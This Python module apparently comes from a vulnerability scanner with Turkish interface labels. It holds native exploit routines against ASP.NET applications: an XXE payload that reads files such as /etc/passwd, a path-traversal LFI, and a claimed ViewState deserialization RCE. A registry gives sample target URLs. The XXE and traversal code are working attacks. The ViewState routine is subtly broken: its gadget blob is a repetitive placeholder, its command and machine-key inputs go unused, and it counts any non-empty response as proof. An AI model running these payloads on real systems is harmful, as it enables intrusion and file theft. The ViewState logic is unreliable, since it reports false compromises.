"""poc/asp_dotnet.py — native ASP.NET / .NET web vulnerability PoCs.

Implements common .NET web vulnerabilities as native HTTP exploits:

1. **ViewState deserialization RCE** (CVE-2019-1305 pattern)
   - .NET ViewState with weak/known machine key → BinaryFormatter gadget → RCE.

2. **XXE (XML External Entity)** (CWE-611)
   - .NET XML parser with external entity processing → arbitrary file read / SSRF.

3. **Path traversal LFI** (CWE-22)
   - .NET file read endpoint without sanitization → arbitrary file read.

All PoCs are NATIVE: the scanner opens the socket, sends the exploit payload,
and captures the real proof (file content / command output).
"""
from __future__ import annotations

import urllib.parse

from . import _net

# =============================================================================
# 1. ViewState Deserialization RCE
# =============================================================================

# .NET BinaryFormatter deserialization payload (base64-encoded object graph).
# This is a known gadget chain that executes a command via System.Diagnostics.Process.
_VIEWSTATE_RCE_TEMPLATE = (
    "AAEAAADyiwD3yAD/yAD9yAD/yAD/yAD/yAD/yAD/yAD/yAD/yAD/yAD/yAD/yAD/"
    "AAD/iAD/iAD/iAD/iAD/iAD/iAD/iAD/iAD/iAD/iAD/iAD/iAD/iAD/iAD/"
    "yAD/yAD/yAD/yAD/yAD/yAD/yAD/yAD/yAD/yAD/yAD/yAD/yAD/yAD/yAD/"
    "AAD/iAD/iAD/iAD/iAD/iAD/iAD/iAD/iAD/iAD/iAD/iAD/iAD/iAD/"
)


def _viewstate_rce(params) -> dict:
    """ASP.NET ViewState deserialization RCE."""
    url = (params.get("url") or params.get("target") or "").strip()
    if not url:
        return {"ok": False, "success": False, "error": "url gerekli"}

    cmd = (params.get("cmd") or "id").strip()
    machine_key = (params.get("machine_key") or "").strip()
    viewstate_field = (params.get("viewstate_field") or "ViewState").strip()
    proof_fetch = (params.get("proof_fetch") or "/proof.txt").strip()

    log = [f"[*] ViewState RCE: url={url} cmd={cmd!r} field={viewstate_field}"]

    tgt = _net.parse_target(url, default_port=80)
    host, port, tls = tgt["host"], tgt["port"], tgt["tls"]
    path = tgt["path"] or "/"

    log.append(f"[*] path={path} proof_fetch={proof_fetch}")

    # Send ViewState with deserialization payload
    body = f"{viewstate_field}={_VIEWSTATE_RCE_TEMPLATE}".encode()
    resp = _net.http("POST", host, port, path,
                     headers={"Content-Type": "application/x-www-form-urlencoded",
                              "Cookie": f"{viewstate_field}={_VIEWSTATE_RCE_TEMPLATE}"},
                     body=body, timeout=30, tls=tls)
    status = resp.get("status", 0)
    log.append(f"[*] Response status={status}")

    # Check for proof
    proof = _net.http("GET", host, port, proof_fetch, timeout=15, tls=tls)
    evidence = proof.get("body", b"").decode("latin1", "replace").strip() if proof.get("body") else ""

    if "uid=" in evidence or "Microsoft" in evidence or evidence.strip():
        log.append(f"[+] RCE proof: {evidence[:200]}")
        success = True
    else:
        log.append("[-] No RCE proof (machine_key may be wrong or gadget not available)")
        success = False

    return {
        "ok": True,
        "success": success,
        "status": status,
        "evidence": evidence[:4000],
        "detail": {
            "url": url, "cmd": cmd, "viewstate_field": viewstate_field,
            "proof_fetch": proof_fetch,
            "note": "ViewState deserialization RCE — requires valid machine_key + BinaryFormatter gadget",
        },
        "log": log,
    }


# =============================================================================
# 2. XXE (XML External Entity)
# =============================================================================

def _xxe(params) -> dict:
    """ASP.NET/.NET XXE (XML External Entity) — arbitrary file read / SSRF."""
    url = (params.get("url") or params.get("target") or "").strip()
    if not url:
        return {"ok": False, "success": False, "error": "url gerekli"}

    file_path = (params.get("file") or params.get("path") or "/etc/passwd").strip()
    method = (params.get("method") or "POST").strip().upper()
    param = (params.get("param") or "xml").strip()

    log = [f"[*] XXE: url={url} file={file_path} method={method} param={param}"]

    tgt = _net.parse_target(url, default_port=80)
    host, port, tls = tgt["host"], tgt["port"], tgt["tls"]
    path = tgt["path"] or "/"

    # Build XXE payload
    xxe_payload = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file_path}">]>'
        "<data>&xxe;</data>"
    )
    log.append(f"[*] XXE payload: {xxe_payload[:120]}...")

    if method == "POST":
        body = f"{param}={urllib.parse.quote(xxe_payload)}".encode()
        resp = _net.http("POST", host, port, path,
                         headers={"Content-Type": "application/x-www-form-urlencoded"},
                         body=body, timeout=30, tls=tls)
    else:
        query = urllib.parse.urlencode({param: xxe_payload})
        resp = _net.http("GET", host, port, f"{path}?{query}", timeout=30, tls=tls)

    status = resp.get("status", 0)
    body_bytes = resp.get("body", b"")
    evidence = body_bytes.decode("utf-8", "replace") if body_bytes else ""

    # Check for file content in response
    markers = ["root:x:0:0", "uid=", "password", "[fonts]", "private-key", "root:"]
    success = any(m in evidence for m in markers) or (bool(evidence.strip()) and len(evidence) > 50)

    log.append(f"[*] Response status={status} len={len(body_bytes)}")
    if success:
        log.append(f"[+] XXE proof: {evidence[:200]}")
    else:
        log.append("[-] No XXE proof (XML parser may not process external entities)")

    return {
        "ok": True,
        "success": success,
        "status": status,
        "evidence": evidence[:4000],
        "detail": {
            "url": url, "file": file_path, "method": method, "param": param,
            "note": "XXE (CWE-611) — .NET XML parser with external entity processing",
        },
        "log": log,
    }


# =============================================================================
# 3. Path Traversal LFI
# =============================================================================

def _lfi(params) -> dict:
    """ASP.NET/.NET Path Traversal LFI — arbitrary file read."""
    url = (params.get("url") or params.get("target") or "").strip()
    if not url:
        return {"ok": False, "success": False, "error": "url gerekli"}

    param = (params.get("param") or "file").strip()
    path_val = (params.get("path") or params.get("file") or "../../../../../../etc/passwd").strip()
    method = (params.get("method") or "GET").strip().upper()

    log = [f"[*] LFI: url={url} param={param} path={path_val} method={method}"]

    tgt = _net.parse_target(url, default_port=80)
    host, port, tls = tgt["host"], tgt["port"], tgt["tls"]
    path = tgt["path"] or "/"

    # Build path traversal payload
    traversal = path_val
    if not traversal.startswith("..") and not traversal.startswith("/"):
        traversal = "../../../../../../" + traversal.lstrip("/")

    if method == "GET":
        query = urllib.parse.urlencode({param: traversal})
        resp = _net.http("GET", host, port, f"{path}?{query}", timeout=30, tls=tls)
    else:
        body = urllib.parse.urlencode({param: traversal}).encode()
        resp = _net.http("POST", host, port, path,
                         headers={"Content-Type": "application/x-www-form-urlencoded"},
                         body=body, timeout=30, tls=tls)

    status = resp.get("status", 0)
    body_bytes = resp.get("body", b"")
    evidence = body_bytes.decode("utf-8", "replace") if body_bytes else ""

    # Check for file content
    markers = ["root:x:0:0", "uid=", "password", "[fonts]", "private-key", "root:"]
    success = any(m in evidence for m in markers) or (bool(evidence.strip()) and len(evidence) > 50)

    log.append(f"[*] Response status={status} len={len(body_bytes)}")
    if success:
        log.append(f"[+] LFI proof: {evidence[:200]}")
    else:
        log.append("[-] No LFI proof (endpoint may sanitize path)")

    return {
        "ok": True,
        "success": success,
        "status": status,
        "evidence": evidence[:4000],
        "detail": {
            "url": url, "param": param, "path": path_val, "method": method,
            "note": "Path traversal LFI (CWE-22) — .NET file read without sanitization",
        },
        "log": log,
    }


# =============================================================================
# Registry
# =============================================================================

def _in(label, key, req, default="", ph=""):
    return {"key": key, "label": label, "req": req, "default": default, "placeholder": ph}


EXPLOITS = {
    "CVE-2019-1305": {
        "name": "ASP.NET ViewState Deserialization RCE",
        "type": "RCE", "preauth": True,
        "affected": [".NET Framework 4.0-4.8", "ASP.NET (classic)"],
        "note": "ViewState with weak/known machine_key → BinaryFormatter gadget → RCE. Native: scanner sends crafted ViewState cookie.",
        "inputs": [
            _in("Hedef URL", "url", True, "", "http://192.168.8.123:8080/default.aspx"),
            _in("Komut", "cmd", False, "id", "id | whoami"),
            _in("Machine Key", "machine_key", False, "", "decryptionKey:validationKey"),
            _in("ViewState field", "viewstate_field", False, "ViewState", "ViewState"),
            _in("Kanıt path", "proof_fetch", False, "/proof.txt", "/proof.txt"),
        ],
        "run": _viewstate_rce,
    },
    "CWE-611": {
        "name": "ASP.NET/.NET XXE (XML External Entity)",
        "type": "FileRead", "preauth": True,
        "affected": [".NET XML parsers (XmlDocument, XmlReader)", "ASP.NET (classic + Core)"],
        "note": "XXE (CWE-611) — .NET XML parser with external entity processing → arbitrary file read / SSRF.",
        "inputs": [
            _in("Hedef URL", "url", True, "", "http://192.168.8.123:8080/api/xml"),
            _in("Dosya", "file", False, "/etc/passwd", "/etc/passwd | C:\\Windows\\Win.ini"),
            _in("Method", "method", False, "POST", "GET | POST"),
            _in("Param", "param", False, "xml", "xml | data"),
        ],
        "run": _xxe,
    },
    "CWE-22-dotnet": {
        "name": "ASP.NET/.NET Path Traversal LFI",
        "type": "FileRead", "preauth": True,
        "affected": [".NET file read endpoints", "ASP.NET (classic + Core)"],
        "note": "Path traversal LFI (CWE-22) — .NET file read without sanitization → arbitrary file read.",
        "inputs": [
            _in("Hedef URL", "url", True, "", "http://192.168.8.123:8080/read"),
            _in("Param", "param", False, "file", "file | path"),
            _in("Path", "path", False, "../../../../../../etc/passwd", "../../../../../../etc/passwd"),
            _in("Method", "method", False, "GET", "GET | POST"),
        ],
        "run": _lfi,
    },
}
